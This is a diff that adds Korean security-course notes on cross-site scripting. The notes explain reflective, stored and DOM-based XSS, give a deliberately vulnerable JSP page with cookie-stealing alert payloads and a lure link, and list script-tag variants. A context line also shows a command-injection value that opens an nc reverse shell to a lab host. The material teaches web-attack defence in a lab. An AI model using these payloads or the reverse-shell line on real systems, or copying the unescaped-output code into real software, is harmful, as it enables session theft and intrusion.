@@ -319,3 +319,109 @@ www.naver.com; nc KALI#2_IP 8282 -e /bin/bash
 
 3. (터미널) 쉘 명령어를 실행 → Kali#1에서 실행된 결과가 터미널에 출력
 ```
+
+# 20190730
+
+## 크로스 사이트 스크립팅(Cross-Site Scripting, XSS)
+    공격자가 전달한 스크립트 코드가 사용자 브라우저를 통해서 실행되는 것
+    → 사용자 브라우져 또는 사용자 PC의 저장된 정보를 탈취
+    → 가짜 페이지를 만들어서 사용자로 하여금 추가 입력을 유도하고, 해당 정보를 탈취
+    → 좀비화하여 원격에서 해당 PC를 조정 => 도구 : BeEF
+
+### 유형
+``` html
+1) Reflective XSS(반사) 
+공격자가 전달한 스크립트 코드가 취얀학 웹 서버를 경유해서 사용자 브라우저에 전달되는 방식
+= 입력값이 입력값 검증 또는 출력값 검증 없이 다음 화면 출력에 그대로 사용되는 경우에발생
+
+예시1. 안녕! <%=request.getParameter("input")%>
+
+예시2. <%
+         out.print("안녕! "+request.getParameter("input"));
+       %>
+
+예시1.과 예시2. 의 코드는 같은 결과를 나타냄.
+
+브라우저의 요청 상황)
+정상입력 : .../do.jsp?input=홍길동  => 안녕! 홍길동
+비정상입력 : .../do.jsp?input=<script>alert(document.cookie)</script> 
+            => 안녕! <script>alert(document.cookie)</script>
+            = 화면에는 안녕! 출력 후 해당브라우저의 쿠키 값이 알람창으로 출력됨.
+
+
+예제) 이클립스-> webcontent/reflective.jsp 생성
+<%@ page language="java" contentType="text/html; charset=EUC-KR"
+    pageEncoding="EUC-KR"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=EUC-KR">
+<title>Insert title here</title>
+</head>
+<body>
+	<%
+		String userid = request.getParameter("userid");
+		if (userid == null || userid.equals("")) {
+	%>
+			<form>
+				<input type="text" name="userid">
+				<input type="submit">	
+			</form>
+	<%
+		} else {
+			out.print("Hello! " + userid);
+		}
+	%>
+</body>
+</html>
+
+
+해당페이지 접속 후 url 확인. 
+John <script> alert(document.cookie) </script> 입력
+
+=> 스크립트가 적용이 된다는 것 확인 후
+http://.../reflective.jsp?userid=John+%3Cscript%3E+alert%28document.cookie%29+%3C%2Fscript%3E 
+해당 스크립트가 작동하는 링크를 이용 불특정 다수에게 링크에 접속하도록 유도.
+```
+
+``` html
+2) Stored XSS (저장)
+공격자가 작성한 스크립트 코드가 취약한 서버에 저장되어 지속적으로 사용자 브라우저로 내려가서 실행되는 것 ⇒ 게시판
+
+                                          (서버)
+(공격자) 게시판 글쓰기        ---------->   글저장
+         <script>...</script>             <script>...</script>
+                                                   |
+                                                   |
+(희생자) 게시판 글보기 ----------------------------+  
+         <script>...</script>
+
+```
+
+``` js
+3) DOM Based XSS
+개발자가 작성한 스크립트 코드의 취약점을 이용한 공격 기법
+document.write(_____________)
+    => write안의 내용을 검증하지 않아, 공격자가 원하는 script가 입력 후 실행되는 경우.
+
+```
+
+## 스크립트 태그 실행 방법
+``` html
+1. <script>XSS</script>
+2. <script src="XXS.js">
+3. <img src="" onerror="javascript:alert(XSS)"> : 이벤트 핸들러 ... 다수
+.
+.
+.
+매우 많음...
+```
+
+## 참고 사이트
+    CSP
+    https://developer.mozilla.org/ko/docs/Web/HTTP/CSP
+
+    https://content-security-policy.com/browser-test/
+
+    XSS Cheat Sheet
+    https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
